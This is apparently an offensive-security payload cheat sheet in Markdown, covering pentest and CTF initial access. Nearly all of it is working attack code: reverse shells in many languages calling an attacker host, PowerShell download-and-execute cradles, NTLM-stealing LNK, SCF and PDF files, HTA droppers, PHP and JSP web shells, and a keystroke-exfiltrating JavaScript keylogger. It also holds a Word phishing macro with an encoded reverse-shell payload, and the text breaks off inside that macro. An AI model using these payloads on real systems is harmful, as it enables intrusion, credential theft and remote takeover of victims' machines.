# Payloads

- [Resources](#resources)

## Table of Contents

- [.LNK (Link) Files](#lnk-link-files)
- [.SCF (Shell Command File) Files](#scf-shell-command-file-files)
- [.URL (URL) Files](#url-uniform-resource-locator-files)
- [An HTML Application (HTA)](#an-html-application-hta)
- [AtomicsDLLSide-Loading .hta File](#atomicsdllside-loading-hta-file)
- [Background Reverse Shells](#background-reverse-shells)
- [Bad PDF](#bad-pdf)
- [Bash Reverse Shell](#bash-reverse-shell)
- [curl Reverse Shell](#curl-reverse-shell)
- [Escape Codes Abuse](#escape-codes-abuse)
- [Exiftool](#exiftool)
- [GhostScript](#ghostscript)
- [GIF](#gif)
- [Groovy (Jenkins) Reverse Shell](#groovy-jenkins-reverse-shell)
- [HoaxShell](#hoaxshell)
- [iconv](#iconf)
- [JAVA Reverse Shell](#java-reverse-shell)
- [JAVA Web Shell](#java-web-shell)
- [JavaScript Keylogger](#javascript-keylogger)
- [JDWP](#jdwp)
- [lnk2pwn](#lnk2pwn)
- [Lua Reverse Shell](#lua-reverse-shell)
- [Macros](#macros)
- [marco_pack](#macro-pack)
- [Markdown Reverse Shell](#markdown-reverse-shell)
- [mkfifo Reverse Shell](#mkfifo-reverse-shell)
- [msfvenom](#msfvenom)
- [Netcat Reverse Shell](#netcat-reverse-shell)
- [Nishang](#nishang)
- [Non-alphanumeric Web Shell](#non-alphanumeric-web-shell)
- [ntlm_theft](#ntml_theft)
- [OS Command Injection](#os-command-injection)
- [PDF](#pdf)
- [Perl Reverse Shell](#perl-reverse-shell)
- [PHP popen Web Shell](#php-popen-web-shell)
- [PHP Reverse Shell](#php-reverse-shell)
- [PHP Web Shell](#php-web-shell)
- [PowerShell Reverse Shell](#powershell-reverse-shell)
- [Python Reverse Shell](#python-reverse-shell)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Ruby Reverse Shell](#ruby-reverse-shell)
- [Spoofing Office Marco](#spoofing-office-macro)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Visual Basic for Application (VBA)](#visual-basic-for-application-vba)
- [Windows Scripting Host (WSH)](#windows-scripting-host-wsh)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [xterm Reverse Shell](#xterm-reverse-shell)
- [ysoserial](#ysoserial)
- [ysoserial.net](#ysoserialnet)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Building Offensive Malicious Documents | Learn various techniques on how to make malicious documents that can execute our malicious code. | https://fareedfauzi.github.io/2022/11/20/Offensive-maldocs.html |
| EXE_to_DLL | Converts a EXE into DLL | https://github.com/hasherezade/exe_to_dll |
| GadgetToJScript | A tool for generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA based scripts. | https://github.com/med0x2e/GadgetToJScript |
| hoaxshell | An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic. | https://github.com/t3l3machus/hoaxshell |
| Intruder Payloads | A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists. | https://github.com/1N3/IntruderPayloads |
| Ivy | Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode. | https://github.com/optiv/Ivy |
| marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
| Nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
| ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
| p0wny@shell:~# | Single-file PHP shell | https://github.com/flozz/p0wny-shell |
| Payload Box | Payload Collection | https://github.com/payloadbox |
| PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | PHP shells that work on Linux OS, macOS, and Windows OS. | https://github.com/ivan-sincek/php-reverse-shell |
| pixload | Image Payload Creating/Injecting tools | https://github.com/sighook/pixload |
| PySoSerial | PySoSerial is a tool for identification and exploitation of insecure deserialization vulnerabilities in python. | https://github.com/burw0r/PySoSerial |
| SharpPyShell | SharPyShell - tiny and obfuscated ASP.NET webshell for C# web applications | https://github.com/antonioCoco/SharPyShell |
| webshell | This is a webshell open source project | https://github.com/tennc/webshell |
| WebShell | Webshell && Backdoor Collection | https://github.com/xl7dev/WebShell |
| Weevely | Weaponized web shell | https://github.com/epinna/weevely3 |
| woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
| wrapwrap |  Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file. | https://github.com/ambionics/wrapwrap |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
| ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |

## .LNK (Link) Files

> https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence

### Quick PowerShell Command Line Example

```cmd
PS C:\> $WScript = New-Object -COM WScript.shell
PS C:\> $SC = $WScript.CreateShortcut('C:\PATH\TO\DIRECTORY\<FILE>.lnk')
PS C:\> $SC.TargetPath = "C:\temp\<FILE>.exe"
PS C:\> $SC.Arguments = ""
PS C:\> $SC.WindowStyle = 7
PS C:\> $SC.save()
```

### Advanced PowerShell Example

```console
$path                      = "$([Environment]::GetFolderPath('Desktop'))\<FILE>.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar" # Calls the SMB share of the responder instance on the C2 server
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = ""

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
```

### Hide Target Folder

```cmd
C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
```

## .SCF (Shell Command File) Files

### Malicious.scf

```console
[Shell]
Command=2
Iconfile=\\<LHOST>\foobar
[Taskbar]
Command=ToggleDesktop
```

## .URL (Uniform Resource Locator) Files

```console
[InternetShortcut]
URL=\\<LHOST>\<SHARE>\<FILE>
```

## An HTML Application (HTA)

### payload.hta

```console
<html>
<body>
<script>
  var c= 'cmd.exe'
  new ActiveXObject('Wscript.Shell').Run(c);
</script>
</body>
</html>
```

### One-Liner

```console
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://<LHOST>/<FILE>.ps1')"</scRipt>
```

## AtomicsDLLSide-Loading .hta File

> https://gist.github.com/MHaggis/90dece4492dc2d3875b846230b837d9b

```console
<html>
<head>
<title>Atomic Red Team - DLL Side-Loading HTA</title>
<HTA:APPLICATION ID="AtomicSideLoad" APPLICATIONNAME="AtomicSideLoad" BORDER="thin" BORDERSTYLE="normal" ICON="shell32.dll,4" >
<script language="VBScript">
Dim shell
Set shell = CreateObject("Wscript.Shell")

' Base64 encoded content of invite.zip - which is https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary
Dim base64EncodedContent
base64EncodedContent = "UEsDB<--- CUT FOR BREVITY --->UAAAA="

' Path to write the encoded file and later, the decoded zip
Dim filePath
filePath = "C:\Windows\Tasks\invite.txt"

' Write the base64 encoded content to a file
Dim fso, textFile
Set fso = CreateObject("Scripting.FileSystemObject")
Set textFile = fso.OpenTextFile(filePath, 2, True)
textFile.Write base64EncodedContent
textFile.Close

' Decode the file from base64 to zip
shell.Run "certutil -decode " & filePath & " " & Replace(filePath, ".txt", ".zip"), 0, True

' Use PowerShell to unzip the file
Dim unzipPath
unzipPath = "C:\Windows\Tasks"
shell.Run "powershell -command Expand-Archive -Path " & Replace(filePath, ".txt", ".zip") & " -DestinationPath " & unzipPath, 0, True

MsgBox "Are You Ready?"
' Run gup.exe
shell.Run "C:\Windows\Tasks\gup.exe", 0, True

MsgBox "DLL Side-Load Operation Completed."
</script>
</head>
<body>
<h2>Atomic Test HTA</h2>
<img src="https://www.redcanary.com/wp-content/uploads/image2-25.png" alt="Atomic Red Team Logo" width="200" height="200">
<p>This Atomic Red Team test is brought to you by: <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary</a></p>
</body>
```

## Background Reverse Shells

```console
$ (mkfifo /tmp/K98LmaT; nc <LHOST> <LPORT> 0</tmp/K98LmaT | /bin/sh >/tmp/K98LmaT 2>&1; rm /tmp/K98LmaT) &
$ script -c 'bash -i' /dev/null </dev/udp/<LHOST>/<LPORT> >&0 2>&1 &
$ screen -md bash -c 'bash -i >/dev/tcp/<LHOST>/<LPORT> 2>&1 0<&1' -md ('start a new detached process')
$ tmux new-session -d -s mysession 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Bad PDF

```console
%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
    /O <<
       /F (\\\\<LHOST>\\<FILE>)
    /D [ 0 /Fit]
    /S /GoToE
    >>
    >>
    /Parent 2 0 R
    /Resources <<
   /Font <<
    /F1 <<
     /Type /Font
     /Subtype /Type1
     /BaseFont /Helvetica
     >>
      >>
    >>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
 /Root 1 0 R
>>
%%EOF
```

## Bash Reverse Shell

```console
$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
$ bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
$ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

### URL Encoded

```console
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<LPORT>%200%3E%261%27
```

## curl Reverse Shell

```console
$ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

### With JWT Token

```console
$ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
```

## Escape Codes Abuse

> https://twitter.com/0xAsm0d3us/status/1774534241084445020

```console
$ echo -e '#!/bin/sh\ncat /etc/passwd\nexit\n\033[A\033[A\033[ATotally not malicious!"' > <FILE>.sh
```

## Exiftool

### PHP into JPG Injection

```console
$ exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
$ exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
$ exiftool "-comment<=back.php" back.png
$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

## GhostScript

```console
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

## GIF

### Magic Byte

Add `GIF8` on line `1` of for example a php shell to get the file recognized as a gif file. Even when you name it `shell.php`.

## Groovy (Jenkins) Reverse Shell

```console
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## HoaxShell

> https://github.com/t3l3machus/hoaxshell

```console
$ python3 hoaxshell.py -s <LHOST> -p <LPORT>
```

## iconv

### Converting Payload to Windows Encoding

```console
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/revshell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

```cmd
C:\> runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADkAOgA4ADAALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
```

## JAVA Reverse Shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

$ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

### shell.jar

```java
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

## JAVA Web Shell

### shell.jsp

```java
<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\\n";
                }
                reader.close();
            }
        } else {
            output = "Unknown action.";
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }
    response.setContentType("text/plain");
    out.print(output);
%>
```

## JavaScript Keylogger

### logger.js

```javascript
var keys='';
var url = 'bitwarden-info.gif?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;

}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = url=keys;
        keys = '';
    }
}, 5000);
```

```html
<!doctype html>
    <script src="log.js">
  </script>
</body></html>
```

## JDWP

### Remote Code Execution (RCE)

```console
$ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
```

## lnk2pwn

> https://github.com/it-gorillaz/lnk2pwn

> https://github.com/tommelo/lnk2pwn

> https://gist.github.com/tommelo/6852d303498403f80e889f3f7a3e7105#file-config-json

```console
{
    "shortcut": {
        "target_path": "C:\\Windows\\System32\\cmd.exe",
        "working_dir": "C:\\Windows\\System32",
        "arguments": "/c powershell.exe iwr -outf %tmp%\\p.vbs http://127.0.0.1/uac_bypass.vbs & %tmp%\\p.vbs",
        "icon_path": "C:\\Windows\\System32\\notepad.exe",
        "icon_index": null,
        "window_style": "MINIMIZED",
        "description": "TRUST ME",
        "fake_extension": ".txt",
        "file_name_prefix": "password"
    },

    "elevated_uac": {
        "file_name": "uac_bypass.vbs",
        "cmd": "cmd.exe /c powershell.exe -nop -w hidden iwr -outf C:\\Windows\\System32\\nc.exe http://127.0.0.1/nc.exe & C:\\Windows\\System32\\nc.exe 127.0.0.1 4444 -e cmd.exe"
    }
}
```

## Lua Reverse Shell

```console
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

## Macros

### Microsoft Office Word Phishing Macro

#### Payload

```console
IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
```

or

```console
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

or

```console
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Encoding

> https://www.base64decode.org/

Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.

```console
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

##### Alternatively using pwsh

```console
$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
```

#### Python Script for Formatting

```console
str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```console
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
```

#### Final Macro

```console
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
    Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
    Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
    Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
    Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
    Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
    Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
    Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
    Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
